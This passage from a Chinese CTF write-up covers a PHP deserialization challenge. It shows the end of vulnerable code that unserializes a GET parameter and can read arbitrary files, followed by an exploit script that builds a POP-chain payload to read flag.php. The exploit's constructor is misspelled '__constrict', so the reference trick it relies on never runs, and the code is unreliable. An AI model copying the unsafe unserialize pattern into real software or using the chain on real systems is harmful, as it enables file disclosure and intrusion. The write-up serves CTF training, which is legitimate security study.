</span>&#123;   </span><br><span class="line">        <span class="keyword">$this</span>-&gt;openstack = unserialize(<span class="keyword">$this</span>-&gt;docker);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;openstack-&gt;neutron = <span class="variable">$heat</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;openstack-&gt;neutron === <span class="keyword">$this</span>-&gt;openstack-&gt;nova)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="string">&quot;./<span class="subst">&#123;$this-&gt;filename&#125;</span>&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (file_get_contents(<span class="variable">$file</span>))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents(<span class="variable">$file</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;keystone lost~&quot;</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pks&#x27;</span>]))  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$logData</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pks&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$logData</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__file__</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>反序列化 pop 链，exp：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">acp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cinder</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$neutron</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nova</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__constrict</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nova = &amp;<span class="keyword">$this</span>-&gt;neutron;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ace</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$openstack</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$docker</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ace();</span><br><span class="line"><span class="variable">$a</span>-&gt;filename = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;docker = serialize(<span class="keyword">new</span> acp());</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> acp();</span><br><span class="line"><span class="variable">$b</span>-&gt;cinder = <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>比赛WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
        <tag>Web</tag>
        <tag>Sec</tag>
      </tags>
  </entry>
</search>
